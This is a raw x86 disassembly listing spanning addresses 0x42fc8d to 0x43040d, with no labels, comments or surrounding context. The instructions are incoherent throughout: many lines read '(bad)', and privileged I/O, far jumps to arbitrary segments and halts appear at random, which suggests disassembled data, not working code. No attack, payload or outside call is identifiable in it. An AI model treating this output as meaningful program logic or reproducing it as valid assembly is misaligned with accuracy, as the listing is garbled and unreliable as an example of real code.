  42fc8d:	and    DWORD PTR [edx+0x6a],ebp
  42fc90:	xchg   edi,eax
  42fc91:	push   ss
  42fc92:	call   0x7f68:0x4fec5570
  42fc99:	mov    esi,0xdd40760a
  42fc9e:	into   
  42fc9f:	lock test BYTE PTR [ebx-0x78],ah
  42fca3:	mov    ebx,0x1b6dad85
  42fca8:	or     eax,0x80f58a4d
  42fcad:	outs   dx,BYTE PTR ds:[esi]
  42fcae:	dec    edx
  42fcaf:	add    DWORD PTR [edi-0x5249224f],edx
  42fcb5:	shl    BYTE PTR [esi+0x47c862ab],cl
  42fcbb:	retf   0x7dcd
  42fcbe:	aad    0x3b
  42fcc0:	or     bl,al
  42fcc2:	inc    esp
  42fcc3:	mov    al,0xd9
  42fcc5:	clc    
  42fcc6:	pop    ecx
  42fcc7:	enter  0x41d4,0xb4
  42fccb:	pop    ebp
  42fccc:	inc    ebp
  42fccd:	push   ebx
  42fcce:	pop    edx
  42fccf:	sbb    eax,0xdada5c32
  42fcd4:	lods   eax,DWORD PTR ds:[esi]
  42fcd5:	cdq    
  42fcd6:	mov    DWORD PTR [ecx-0x7dac0d35],ebp
  42fcdc:	(bad)  
  42fcde:	(bad)  
  42fcdf:	push   ebp
  42fce0:	sbb    edx,esp
  42fce2:	add    eax,0xa391e30c
  42fce7:	aad    0xc2
  42fce9:	inc    esi
  42fcea:	push   ebx
  42fceb:	push   es
  42fcec:	xor    eax,0x573d65e7
  42fcf1:	inc    edi
  42fcf2:	ror    BYTE PTR [ebp-0x13ab43ae],1
  42fcf8:	xor    dh,bl
  42fcfa:	mov    al,0x6d
  42fcfc:	pop    ebx
  42fcfd:	arpl   WORD PTR [edi],bx
  42fcff:	(bad)  
  42fd00:	aad    0xb6
  42fd02:	sub    edi,eax
  42fd04:	xor    BYTE PTR [ebx-0x62],dl
  42fd07:	ins    DWORD PTR es:[edi],dx
  42fd08:	lahf   
  42fd09:	pop    edx
  42fd0a:	outs   dx,BYTE PTR ds:[esi]
  42fd0b:	in     al,dx
  42fd0c:	mov    eax,DWORD PTR [eax]
  42fd0e:	jmp    0xbb51:0x1407c803
  42fd15:	aam    0x36
  42fd17:	add    BYTE PTR [esi],cl
  42fd19:	mov    ds:0x6768895c,al
  42fd1e:	(bad)  
  42fd1f:	lds    eax,FWORD PTR [eax+0x7a5b6dba]
  42fd25:	jne    0x42fd01
  42fd27:	jge    0x42fd5e
  42fd29:	adc    eax,0x50db6a7e
  42fd2e:	ins    BYTE PTR es:[edi],dx
  42fd2f:	popa   
  42fd30:	inc    ecx
  42fd31:	mov    esi,0x7742d4e7
  42fd36:	jne    0x42fdae
  42fd38:	pop    ebx
  42fd39:	push   0x40855622
  42fd3e:	dec    eax
  42fd3f:	cmp    al,0xc3
  42fd41:	js     0x42fd3e
  42fd43:	pop    edx
  42fd44:	sub    BYTE PTR [esi+0x23b611a5],dh
  42fd4a:	xchg   ebx,eax
  42fd4b:	pop    ebp
  42fd4c:	ins    DWORD PTR es:[di],dx
  42fd4e:	mov    ds:0xa4dd29b1,eax
  42fd53:	(bad)
  42fd56:	inc    eax
  42fd57:	je     0x42fced
  42fd59:	mov    dh,0x2d
  42fd5b:	mov    BYTE PTR [ebp+0x5280a7c0],cl
  42fd61:	pop    DWORD PTR [eax]
  42fd63:	jne    0x42fd06
  42fd65:	push   ebp
  42fd66:	mov    ebp,0x3b371db8
  42fd6b:	add    bl,al
  42fd6d:	ss inc ebp
  42fd6f:	imul   ecx,DWORD PTR ds:0x20a32fb,0x17405b38
  42fd79:	add    eax,0x1390cdbd
  42fd7e:	sbb    eax,0x868dc55
  42fd83:	nop
  42fd84:	in     al,0x7b
  42fd86:	aam    0x64
  42fd88:	mov    dh,0xb5
  42fd8a:	mov    cl,0x6d
  42fd8c:	mov    ecx,0xbd21fe38
  42fd91:	mov    eax,ds:0x17c80a10
  42fd96:	inc    ecx
  42fd97:	or     eax,esp
  42fd99:	ror    BYTE PTR [edi+0x2e],cl
  42fd9c:	push   esp
  42fd9d:	ins    DWORD PTR es:[edi],dx
  42fd9e:	(bad)  
  42fda0:	push   0x8b91e5b6
  42fda5:	fnstenv [edx]
  42fda7:	push   ebx
  42fda8:	or     ah,BYTE PTR [ecx-0x2ffb27fe]
  42fdae:	mov    ebx,DWORD PTR [edi]
  42fdb0:	loope  0x42fd65
  42fdb2:	xor    bl,bl
  42fdb4:	push   esi
  42fdb5:	cmp    BYTE PTR [edx+0x80501a4],0x1f
  42fdbc:	sub    al,0x45
  42fdbe:	mov    ds:0xda6e0a26,eax
  42fdc3:	mov    al,0x83
  42fdc5:	(bad)  
  42fdc6:	and    ah,BYTE PTR ds:0x9b0b4b8d
  42fdcc:	ds xchg edi,eax
  42fdce:	or     eax,0xa2fafb2f
  42fdd3:	imul   esi,DWORD PTR [esi+0x6b],0x2944556c
  42fdda:	in     al,0x62
  42fddc:	xor    DWORD PTR [eax-0x68],esp
  42fddf:	add    DWORD PTR [edx+ebp*2-0x49],ebx
  42fde3:	inc    ecx
  42fde4:	jb     0x42fddd
  42fde6:	jmp    0x3bbae42f
  42fdeb:	stos   BYTE PTR es:[edi],al
  42fdec:	mov    eax,0x74bcd975
  42fdf1:	out    dx,eax
  42fdf2:	and    ch,cl
  42fdf4:	dec    edi
  42fdf5:	dec    esi
  42fdf6:	pop    ebx
  42fdf7:	or     ebp,DWORD PTR [edx]
  42fdf9:	ins    DWORD PTR es:[edi],dx
  42fdfa:	pop    edi
  42fdfb:	mov    ch,0x77
  42fdfd:	xchg   BYTE PTR [ebp-0x41],cl
  42fe00:	push   ss
  42fe01:	mov    dh,0x42
  42fe03:	pop    ss
  42fe04:	ins    BYTE PTR es:[edi],dx
  42fe05:	pop    edx
  42fe06:	push   edx
  42fe07:	mov    DWORD PTR [esi-0x5fa21ccc],eax
  42fe0d:	mov    al,0xdd
  42fe0f:	mov    dh,0x24
  42fe11:	ds rol eax,1
  42fe14:	(bad)  
  42fe15:	shl    DWORD PTR [ebp-0x5224fb10],cl
  42fe1b:	mov    ch,0x26
  42fe1d:	mov    bh,0xd
  42fe1f:	inc    ecx
  42fe20:	and    dl,al
  42fe22:	ja     0x42fe12
  42fe24:	sbb    BYTE PTR [ebx-0x45],0xd4
  42fe28:	imul   ecx,DWORD PTR [esp+edx*1],0x61
  42fe2c:	mov    edx,0xb5ed1d8f
  42fe31:	cs loop 0x42fe76
  42fe34:	cdq    
  42fe35:	in     eax,0x1f
  42fe37:	mov    eax,0xd8a364f8
  42fe3c:	adc    eax,0xc17959c1
  42fe41:	(bad)  
  42fe42:	xor    BYTE PTR [edx+0x2c],bh
  42fe45:	fnsave [esi-0x2e5bb54a]
  42fe4b:	and    esp,ebp
  42fe4d:	inc    esp
  42fe4e:	lods   eax,DWORD PTR ds:[esi]
  42fe4f:	push   ebx
  42fe50:	enter  0xb6bb,0x5b
  42fe54:	inc    edi
  42fe55:	mov    cl,0xea
  42fe57:	dec    ebp
  42fe58:	popf   
  42fe59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe5a:	sub    BYTE PTR [eax+0x4d0b1aec],ch
  42fe60:	mov    ch,0x8b
  42fe62:	dec    ebp
  42fe63:	arpl   WORD PTR [esi],si
  42fe65:	cmp    DWORD PTR [ebp+0x6b6d8dbe],0xffffffb7
  42fe6c:	bnd jne 0x42fe6f
  42fe6f:	mov    WORD PTR [ebx+0x20],?
  42fe72:	(bad)
  42fe75:	push   0x44ade091
  42fe7a:	xchg   ebp,eax
  42fe7b:	mov    DWORD PTR [edx-0x44bed45a],esi
  42fe81:	rcl    BYTE PTR [ebp-0x3f],1
  42fe84:	dec    esp
  42fe85:	das    
  42fe86:	sub    al,0xf6
  42fe88:	hlt    
  42fe89:	dec    esi
  42fe8a:	inc    ecx
  42fe8b:	pop    ecx
  42fe8c:	push   es
  42fe8d:	stos   BYTE PTR es:[edi],al
  42fe8e:	in     eax,dx
  42fe8f:	inc    esi
  42fe90:	leave  
  42fe91:	scas   al,BYTE PTR es:[edi]
  42fe92:	push   edx
  42fe93:	add    eax,0xda8a742e
  42fe98:	inc    ebp
  42fe99:	rol    BYTE PTR [edx],0x2
  42fe9c:	sub    esp,DWORD PTR [edx]
  42fe9e:	loop   0x42fe76
  42fea0:	inc    eax
  42fea1:	mov    ch,0xed
  42fea3:	rcl    cl,cl
  42fea5:	dec    esp
  42fea6:	push   0x32119508
  42feab:	push   0x1ad5d403
  42feb0:	retf   
  42feb1:	inc    esp
  42feb2:	mov    dh,0x39
  42feb4:	es mov al,0xd1
  42feb7:	inc    esi
  42feb8:	(bad)  [eax+0x37]
  42febb:	loopne 0x42fe6e
  42febd:	mov    edx,0xa5c1f716
  42fec2:	inc    esi
  42fec3:	mov    cl,0x3a
  42fec5:	mov    ah,dh
  42fec7:	sbb    eax,0x6d8316f3
  42fecc:	add    DWORD PTR [eax-0x3f],esi
  42fecf:	lahf   
  42fed0:	inc    ecx
  42fed1:	sbb    al,dh
  42fed3:	es pusha 
  42fed5:	arpl   WORD PTR [edi+0x75],dx
  42fed8:	outs   dx,BYTE PTR ds:[esi]
  42fed9:	mov    dl,0x35
  42fedb:	xor    DWORD PTR [ebx],esp
  42fedd:	psubsb mm2,QWORD PTR [esi+0x372a6a88]
  42fee4:	in     eax,dx
  42fee5:	sbb    eax,0xa6b6dd97
  42feea:	add    cl,BYTE PTR ds:0x44f417ee
  42fef0:	rcl    BYTE PTR [eax],0x19
  42fef3:	push   0x47
  42fef5:	mov    al,0x50
  42fef7:	adc    edx,esp
  42fef9:	jmp    0x42ff3e
  42fefb:	mov    al,ds:0x542db85a
  42ff00:	inc    eax
  42ff01:	pusha  
  42ff02:	stos   BYTE PTR es:[edi],al
  42ff03:	into   
  42ff04:	dec    ecx
  42ff05:	cli    
  42ff06:	mov    bl,0xc1
  42ff08:	push   es
  42ff09:	add    BYTE PTR [eax-0x2c],bl
  42ff0c:	mov    esi,0x6c20f12e
  42ff11:	sub    ah,BYTE PTR [edx+0x3]
  42ff14:	imul   ebp,DWORD PTR [ebp+0x7],0xffffffe9
  42ff18:	xchg   BYTE PTR [eax+0x6b6db76d],ah
  42ff1e:	xor    ebp,esp
  42ff20:	retf   0x8b9
  42ff23:	rcl    ebp,1
  42ff25:	sbb    esp,DWORD PTR [ebx]
  42ff27:	cli    
  42ff28:	push   es
  42ff29:	push   0xffffffdb
  42ff2b:	inc    ebp
  42ff2c:	aad    0x44
  42ff2e:	mov    dh,0xcb
  42ff30:	aam    0x9
  42ff32:	inc    eax
  42ff33:	sbb    ebx,ebx
  42ff35:	(bad)  
  42ff36:	sti    
  42ff37:	scas   al,BYTE PTR es:[edi]
  42ff38:	or     al,0x8b
  42ff3a:	pop    ss
  42ff3b:	jl     0x42ffa9
  42ff3d:	nop
  42ff3e:	aaa    
  42ff3f:	sbb    dl,BYTE PTR [ebp+0x5d]
  42ff42:	(bad)  
  42ff43:	mov    esp,0xdb3ea515
  42ff48:	or     edx,ebx
  42ff4a:	or     ch,BYTE PTR [eax-0x77]
  42ff4d:	sbb    BYTE PTR [ebx],dl
  42ff4f:	test   al,0x15
  42ff51:	ss inc ebp
  42ff53:	mov    ah,0x3e
  42ff55:	les    ebp,FWORD PTR [esi]
  42ff57:	pop    ebx
  42ff58:	jmp    0x42ff57
  42ff5a:	call   0xe0f4b621
  42ff5f:	xchg   ecx,eax
  42ff60:	data16 mov al,0xd7
  42ff63:	fst    QWORD PTR [edi+0x10da1dab]
  42ff69:	lds    ebp,FWORD PTR [esi]
  42ff6b:	test   BYTE PTR es:[edi-0x1d],dl
  42ff6f:	add    eax,ecx
  42ff71:	in     al,dx
  42ff72:	mov    ah,BYTE PTR [eax-0x27]
  42ff75:	add    dl,0x4c
  42ff78:	mov    ds:0x55a1507a,eax
  42ff7d:	or     eax,0x2ed8cc14
  42ff82:	push   0xffffffe8
  42ff84:	rol    DWORD PTR [ebp+0x2ff5746d],1
  42ff8a:	hlt    
  42ff8b:	sbb    DWORD PTR ds:0x707e8a7f,ebx
  42ff91:	mov    esp,esi
  42ff93:	dec    ecx
  42ff94:	pop    esi
  42ff95:	ja     0x42ff2b
  42ff97:	dec    ebx
  42ff98:	or     eax,0xf99b6c05
  42ff9d:	push   ebx
  42ff9e:	ret    
  42ff9f:	or     ecx,DWORD PTR [edx+0x5b822a6f]
  42ffa5:	mov    ebx,0xbc6b386d
  42ffaa:	jge    0x430019
  42ffac:	je     0x42ff55
  42ffae:	stos   BYTE PTR es:[edi],al
  42ffaf:	in     al,0xdb
  42ffb1:	(bad)  
  42ffb2:	mov    dh,0xb
  42ffb4:	imul   ebp,edi,0xffffffed
  42ffb7:	inc    esp
  42ffb8:	scas   eax,DWORD PTR es:[edi]
  42ffb9:	or     DWORD PTR [edx+0xd0b7f68],ebx
  42ffbf:	add    eax,0xe13e716c
  42ffc4:	sbb    BYTE PTR [esi+0x73],0x4a
  42ffc8:	xor    al,0x9a
  42ffca:	mov    BYTE PTR [edi+0x531b2ead],ah
  42ffd0:	lods   eax,DWORD PTR ds:[esi]
  42ffd1:	inc    ebp
  42ffd2:	mov    al,0xd0
  42ffd4:	pop    esp
  42ffd5:	rcr    DWORD PTR [esi+esi*4-0x48949e92],cl
  42ffdc:	(bad)  
  42ffdd:	shl    edi,cl
  42ffdf:	fstp   TBYTE PTR [edx+0x10]
  42ffe2:	push   esp
  42ffe3:	inc    esp
  42ffe4:	out    0x55,al
  42ffe6:	fs mov dh,0x75
  42ffe9:	push   eax
  42ffea:	jno    0x42ffbd
  42ffec:	shr    ebp,0x8d
  42ffef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fff0:	aaa    
  42fff1:	out    dx,eax
  42fff2:	fld    TBYTE PTR [ebp-0x56aa1757]
  42fff8:	test   BYTE PTR [eax+0x41],bl
  42fffb:	push   eax
  42fffc:	and    edi,eax
  42fffe:	(bad)  
  42ffff:	mov    ds:0x450010da,al
  430004:	test   eax,0xd50d11f6
  430009:	push   cs
  43000a:	push   edi
  43000b:	pushf  
  43000c:	mov    dl,0x4a
  43000e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43000f:	fld    TBYTE PTR [edx+0x173946b6]
  430015:	aad    0xdd
  430017:	xchg   BYTE PTR [edi+0x44b51ab7],bh
  43001d:	xor    al,0x5e
  43001f:	and    DWORD PTR [ebx+0x4006527b],ecx
  430025:	pop    ss
  430026:	inc    esp
  430027:	jg     0x4300a3
  430029:	nop
  43002a:	mov    al,cs:0x54cb8896
  430030:	shr    BYTE PTR [ecx-0x25],cl
  430033:	fdiv   DWORD PTR [esi-0x4c97fa20]
  430039:	xor    BYTE PTR [edi+0x59c6359f],bl
  43003f:	(bad)  
  430041:	pop    eax
  430042:	jle    0x430099
  430044:	in     al,0x0
  430046:	push   ds
  430047:	xchg   edi,eax
  430048:	rol    DWORD PTR [esi],cl
  43004a:	je     0x43007c
  43004c:	mov    al,ds:0x8755fd00
  430051:	push   ss
  430052:	sbb    ch,BYTE PTR [eax]
  430054:	push   esp
  430055:	popf   
  430056:	retf   0x9596
  430059:	loopne 0x430011
  43005b:	shr    DWORD PTR [eax-0x499f5143],1
  430061:	xor    bh,dh
  430063:	cmp    esp,DWORD PTR [eax-0x55]
  430066:	mov    al,ds:0xeb260fa3
  43006b:	sahf   
  43006c:	fild   DWORD PTR [ebp+eax*8-0x7a]
  430070:	(bad)
  430073:	mov    al,0x9d
  430075:	es into 
  430077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430078:	test   DWORD PTR [esi],ecx
  43007a:	push   0x881152bc
  43007f:	lods   eax,DWORD PTR ds:[esi]
  430080:	jecxz  0x430086
  430082:	je     0x43005f
  430084:	mov    dh,0xd6
  430086:	push   eax
  430087:	je     0x4300bb
  430089:	xor    esp,DWORD PTR [esi]
  43008b:	lds    edi,FWORD PTR [edx+0x76da80e8]
  430091:	or     al,0x2b
  430093:	scas   al,BYTE PTR es:[edi]
  430094:	stos   BYTE PTR es:[edi],al
  430095:	mov    WORD PTR [esp+ebx*1],cs
  430098:	or     eax,0x4bda5c11
  43009d:	pop    edi
  43009e:	sbb    eax,0x32c78002
  4300a3:	in     eax,dx
  4300a4:	mov    dh,0x6d
  4300a6:	ins    BYTE PTR es:[edi],dx
  4300a7:	xor    BYTE PTR [ebx+0x4e],0x31
  4300ab:	xlat   BYTE PTR ds:[ebx]
  4300ac:	sbb    al,0x6b
  4300ae:	ret    
  4300af:	push   ebx
  4300b0:	mov    eax,ds:0xaa86d440
  4300b5:	int3   
  4300b6:	pop    es
  4300b7:	out    0x35,al
  4300b9:	bound  ebp,QWORD PTR [ebx-0x7e]
  4300bc:	fisubr DWORD PTR [edx-0x5]
  4300bf:	pavgw  mm1,QWORD PTR [edi]
  4300c2:	adc    al,0x8f
  4300c4:	add    DWORD PTR [eax+0x74353451],esp
  4300ca:	retf   0xbeda
  4300cd:	mov    dh,0x5b
  4300cf:	ret    0x4012
  4300d2:	dec    edx
  4300d3:	(bad)  
  4300d4:	mov    ds:0x6368e6f7,eax
  4300d9:	mov    DWORD PTR [esi+0x5b],esi
  4300dc:	cmp    ebx,DWORD PTR [eax]
  4300de:	fstp   QWORD PTR [ecx-0x33d3a92f]
  4300e4:	iret   
  4300e5:	stos   BYTE PTR es:[edi],al
  4300e6:	outs   dx,BYTE PTR ds:[esi]
  4300e7:	and    eax,0xd7f54e62
  4300ec:	test   dl,cl
  4300ee:	aad    0xc6
  4300f0:	push   edi
  4300f1:	sbb    ebx,edi
  4300f3:	ret    0xb31a
  4300f6:	push   cs
  4300f7:	aad    0xa3
  4300f9:	test   DWORD PTR ds:0x731d5b11,ecx
  4300ff:	ja     0x430165
  430101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430102:	dec    ecx
  430103:	jmp    0x1d83:0x5b12db16
  43010a:	or     eax,0xa519f97e
  43010f:	lods   eax,DWORD PTR ds:[esi]
  430110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430111:	es pop eax
  430113:	call   0x19fe8df8
  430118:	stos   BYTE PTR es:[edi],al
  430119:	jecxz  0x43015d
  43011b:	inc    edi
  43011c:	rcr    BYTE PTR [esp+edi*1-0x77ce1243],1
  430123:	enter  0xb49c,0x6e
  430127:	gs popa 
  430129:	jne    0x4300b3
  43012b:	in     al,dx
  43012c:	pop    edi
  43012d:	ficom  DWORD PTR ds:0x2ea08ebb
  430133:	sub    eax,0x8d7a23b2
  430138:	jecxz  0x430134
  43013a:	in     eax,dx
  43013b:	mov    BYTE PTR ds:0x741ee6c5,bl
  430141:	pop    es
  430142:	jg     0x43016a
  430144:	sub    al,0xa1
  430146:	aad    0x85
  430148:	jbe    0x4300eb
  43014a:	push   eax
  43014b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43014c:	popa   
  43014d:	mov    ds:0xd0be07e6,eax
  430152:	pop    ebx
  430153:	fcmovnbe st,st(6)
  430155:	add    eax,0x7f41d5e3
  43015a:	push   cs
  43015b:	(bad)  
  43015c:	fsub   QWORD PTR [edi+0x535a16bb]
  430162:	jnp    0x4301c9
  430164:	pop    edi
  430165:	sbb    al,0x4b
  430167:	ficom  DWORD PTR [eax+0x41]
  43016a:	rcr    BYTE PTR [edx],1
  43016c:	adc    al,0x1a
  43016e:	sahf   
  43016f:	or     edi,ebx
  430171:	jg     0x43015e
  430173:	ss push 0xf4094aad
  430179:	cdq    
  43017a:	jo     0x43017f
  43017c:	arpl   WORD PTR [ecx],dx
  43017e:	jmp    0x4301de
  430180:	stos   DWORD PTR es:[edi],eax
  430181:	mov    ecx,0x6f790074
  430186:	loope  0x4301a1
  430188:	pop    es
  430189:	add    ax,0x7346
  43018d:	ins    DWORD PTR es:[edi],dx
  43018e:	lods   al,BYTE PTR ds:[esi]
  43018f:	bound  ecx,QWORD PTR [edi]
  430191:	outs   dx,BYTE PTR ds:[esi]
  430192:	test   al,0x2f
  430194:	or     eax,0xab5849c
  430199:	fsub   QWORD PTR ds:0xb1417909
  43019f:	add    DWORD PTR [edx+0x3b7421b3],esi
  4301a5:	imul   ebx,DWORD PTR ds:0x6d810a5b,0x763b789a
  4301af:	push   ebx
  4301b0:	and    esp,esi
  4301b2:	int3   
  4301b3:	ins    DWORD PTR es:[edi],dx
  4301b4:	scas   al,BYTE PTR es:[edi]
  4301b5:	jb     0x4301e8
  4301b7:	mov    cl,0x6d
  4301b9:	pop    ss
  4301ba:	or     DWORD PTR [ebx+ebx*8+0x5c],esp
  4301be:	xlat   BYTE PTR ds:[ebx]
  4301bf:	ins    DWORD PTR es:[edi],dx
  4301c0:	pop    es
  4301c1:	jb     0x4301c4
  4301c3:	outs   dx,DWORD PTR ds:[esi]
  4301c4:	add    edx,DWORD PTR [edi]
  4301c6:	sub    esi,DWORD PTR [ebx]
  4301c8:	sub    DWORD PTR cs:[edi-0x1a],esi
  4301cc:	mov    edx,0x6b0165ae
  4301d1:	sbb    ebp,DWORD PTR [esi+0x17]
  4301d4:	ins    DWORD PTR es:[edi],dx
  4301d5:	ins    DWORD PTR es:[edi],dx
  4301d6:	jmp    0x430222
  4301d8:	out    dx,al
  4301d9:	jae    0x430238
  4301db:	ins    BYTE PTR es:[edi],dx
  4301dc:	adc    eax,0x65b1036d
  4301e1:	cmp    eax,DWORD PTR [edi]
  4301e3:	jne    0x4301c2
  4301e5:	pop    eax
  4301e6:	or     eax,DWORD PTR ds:0x6911613f
  4301ec:	sub    ebp,DWORD PTR [esi+0x17]
  4301ef:	imul   ebp,esi,0xffffff96
  4301f2:	xor    edx,DWORD PTR [ebx]
  4301f4:	ins    BYTE PTR es:[edi],dx
  4301f5:	add    BYTE PTR [edi+esi*2+0x2b],ch
  4301f9:	popf   
  4301fa:	int3   
  4301fb:	popf   
  4301fc:	lds    edi,FWORD PTR [esi+0x3f69731d]
  430202:	and    BYTE PTR [edi],bl
  430204:	iret   
  430205:	fsubr  st,st(3)
  430207:	xchg   ah,ch
  430209:	adc    bl,BYTE PTR [ebp+0x25690b77]
  43020f:	lahf   
  430210:	outs   dx,BYTE PTR ds:[esi]
  430211:	jae    0x430198
  430213:	dec    eax
  430214:	pop    edx
  430215:	pop    ds
  430216:	inc    ebp
  430217:	jbe    0x43021e
  430219:	and    eax,0xdb7b6eb0
  43021e:	inc    ecx
  43021f:	outs   dx,DWORD PTR ds:[esi]
  430220:	sbb    eax,0x52b27373
  430225:	test   bh,ch
  430227:	sbb    eax,0x7b297797
  43022c:	add    BYTE PTR [ebx],dh
  43022e:	cwde   
  43022f:	dec    edx
  430230:	lods   al,BYTE PTR ds:[esi]
  430231:	stos   BYTE PTR es:[edi],al
  430232:	cmp    BYTE PTR [ecx],bh
  430234:	pop    es
  430235:	sar    DWORD PTR [ebp+0x6e],0x6c
  430239:	inc    esi
  43023a:	jge    0x43023f
  43023c:	xchg   ebx,eax
  43023d:	xlat   BYTE PTR ds:[ebx]
  43023e:	push   es
  43023f:	pop    es
  430240:	dec    edi
  430241:	aaa    
  430242:	leave  
  430243:	int    0x36
  430245:	or     eax,0x6f004d79
  43024a:	pop    es
  43024b:	xor    ecx,DWORD PTR [ebp+0x755ecd35]
  430251:	or     DWORD PTR [edi],0xffffffe6
  430254:	push   edi
  430255:	fldcw  WORD PTR [esi+0x4d]
  430258:	fadd   DWORD PTR ss:[eax+0x72570813]
  43025f:	adc    DWORD PTR [esi],eax
  430261:	fstp   DWORD PTR [ebx+0x1f619b25]
  430267:	and    DWORD PTR [bx+di],edx
  43026a:	scas   al,BYTE PTR es:[edi]
  43026b:	mov    ebx,0xe71ad82c
  430270:	aad    0x73
  430272:	add    DWORD PTR [ecx-0x3b],ebp
  430275:	xor    dh,BYTE PTR [ebx]
  430277:	(bad)  
  430278:	mov    ebp,0x25030d6e
  43027d:	cmc    
  43027e:	je     0x43028f
  430280:	nop
  430281:	and    eax,0x1d25e32c
  430286:	sbb    DWORD PTR [esi],ecx
  430288:	(bad)  
  430289:	adc    DWORD PTR [esi-0x3c96328b],eax
  43028f:	gs xor al,0x1d
  430292:	or     eax,0x30cf2933
  430297:	sub    eax,0x3b282578
  43029c:	dec    esp
  43029d:	cwde   
  43029e:	cmp    esp,DWORD PTR [edi+0x21841059]
  4302a4:	sbb    ebx,DWORD PTR [ebx]
  4302a6:	int    0x63
  4302a8:	out    0xba,eax
  4302aa:	aaa    
  4302ab:	(bad)  
  4302ac:	popf   
  4302ad:	frstor [esi+0x2b]
  4302b0:	ins    BYTE PTR es:[edi],dx
  4302b1:	or     DWORD PTR [edx],esp
  4302b3:	lds    eax,FWORD PTR ds:0xb218c62e
  4302b9:	ror    edi,0x19
  4302bc:	aaa    
  4302bd:	outs   dx,DWORD PTR ds:[esi]
  4302be:	imul   ebp,DWORD PTR [esi-0x5d],0x51
  4302c2:	xchg   esp,eax
  4302c3:	enter  0x2833,0x1f
  4302c7:	jecxz  0x43032a
  4302c9:	mov    edx,0x208d8337
  4302ce:	cmp    esp,DWORD PTR [ebp+0x349b30ec]
  4302d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4302d5:	sbb    eax,0x637400b5
  4302da:	or     ebp,DWORD PTR [ebx+0x75834adf]
  4302e0:	add    eax,0x75cc3572
  4302e5:	and    ebp,DWORD PTR [ebx+0xb623746]
  4302eb:	adc    DWORD PTR [edi],edx
  4302ed:	jmp    0x4302a9
  4302ef:	mov    bh,0xfd
  4302f1:	dec    ebp
  4302f2:	or     ebp,edx
  4302f4:	push   0x9d6f410b
  4302f9:	fadd   DWORD PTR [edi+0x1703deeb]
  4302ff:	pop    ds
  430300:	add    al,0x41
  430302:	cmp    eax,0xd7070965
  430307:	lea    esi,[eax]
  430309:	ins    BYTE PTR es:[edi],dx
  43030a:	inc    DWORD PTR [ecx+0x9]
  43030d:	add    edx,DWORD PTR [bp+di+0x63]
  430311:	and    ecx,DWORD PTR [ebp-0x59]
  430314:	or     DWORD PTR [edi+0x5d],ebp
  430317:	je     0x43037b
  430319:	test   eax,0xecdd707
  43031e:	dec    ebp
  43031f:	pop    ecx
  430320:	arpl   di,bx
  430322:	emms   
  430324:	dec    esi
  430325:	or     eax,eax
  430327:	mov    edx,0x2176596e
  43032c:	adc    DWORD PTR [edi+eax*1+0x63],eax
  430330:	adc    DWORD PTR [ebx],esp
  430332:	idiv   BYTE PTR [ebp+0x7969af47]
  430338:	outs   dx,DWORD PTR ds:[esi]
  430339:	pop    es
  43033a:	fwait
  43033b:	aaa    
  43033c:	xchg   ebp,eax
  43033d:	int    0x38
  43033f:	add    edx,DWORD PTR [ebx-0x5b6af115]
  430345:	jmp    0x91a561e7
  43034a:	aaa    
  43034b:	jge    0x4303c8
  43034d:	inc    ebp
  43034e:	xchg   DWORD PTR [edi-0x54],eax
  430351:	fwait
  430352:	aas    
  430353:	sbb    eax,0x458b6f63
  430358:	fisttp WORD PTR [ebx+0x48]
  43035b:	dec    edi
  43035c:	out    dx,eax
  43035d:	ins    BYTE PTR es:[edi],dx
  43035e:	stc    
  43035f:	or     eax,DWORD PTR ds:0xc9b96764
  430365:	dec    esi
  430366:	jnp    0x430391
  430368:	and    eax,0x9120afdb
  43036d:	adc    esp,DWORD PTR [edx+0x74]
  430370:	stos   DWORD PTR es:[edi],eax
  430371:	outs   dx,DWORD PTR ds:[esi]
  430372:	and    edi,DWORD PTR [ebp+0x566c0b27]
  430378:	xchg   edx,eax
  430379:	daa    
  43037a:	rol    DWORD PTR [ecx-0x69],0xb0
  43037e:	idiv   DWORD PTR [edx-0x628622e4]
  430384:	icebp  
  430385:	cdq    
  430386:	cmp    eax,0xb67758dc
  43038b:	pop    ecx
  43038c:	inc    ebx
  43038d:	sbb    edi,DWORD PTR [edx]
  43038f:	das    
  430390:	fs adc eax,0x8db1ba61
  430396:	sbb    ecx,DWORD PTR [edx]
  430398:	push   ebp
  430399:	pop    ds
  43039a:	mov    ecx,0x4b7dc320
  43039f:	call   0x4f55:0x4f8f35a7
  4303a6:	mov    WORD PTR [esi-0x27],gs
  4303a9:	ret    
  4303aa:	aaa    
  4303ab:	arpl   cx,cx
  4303ad:	adc    DWORD PTR [ecx+0x63],esp
  4303b0:	cwde   
  4303b1:	xor    BYTE PTR [eax],bl
  4303b3:	fisttp QWORD PTR [ecx+0x3]
  4303b6:	add    eax,DWORD PTR [ebx]
  4303b8:	sti    
  4303b9:	and    al,0x4c
  4303bb:	cmp    BYTE PTR [ecx+ebx*8+0x6f],cl
  4303bf:	in     eax,dx
  4303c0:	jmp    0xc86fcb49
  4303c5:	add    eax,DWORD PTR [edi]
  4303c7:	add    ebp,esp
  4303c9:	popa   
  4303ca:	adc    BYTE PTR [esi],al
  4303cc:	loope  0x4303d1
  4303ce:	fild   WORD PTR [ebx]
  4303d0:	rol    DWORD PTR [ebx],cl
  4303d2:	retf   
  4303d3:	inc    esi
  4303d4:	pop    ecx
  4303d5:	adc    BYTE PTR [esi],al
  4303d7:	add    eax,ecx
  4303d9:	add    BYTE PTR [eax],dh
  4303db:	ss push esi
  4303dd:	add    ch,cl
  4303df:	outs   dx,DWORD PTR ds:[esi]
  4303e0:	imul   eax,DWORD PTR [ebp+0x23707774],0x61724923
  4303ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4303eb:	inc    edi
  4303ec:	sbb    eax,0xde1c3a77
  4303f1:	jb     0x430376
  4303f3:	xor    DWORD PTR [bx+0x6459],ecx
  4303f8:	push   ebx
  4303f9:	rcr    BYTE PTR [eax+0x6b],cl
  4303fc:	mov    edi,0x4f76131f
  430401:	aaa    
  430402:	adc    ebx,0x29
  430405:	pop    ss
  430406:	and    DWORD PTR [ecx+0x5efb2a2b],edx
  43040c:	(bad)  
  43040d:	dec    edi
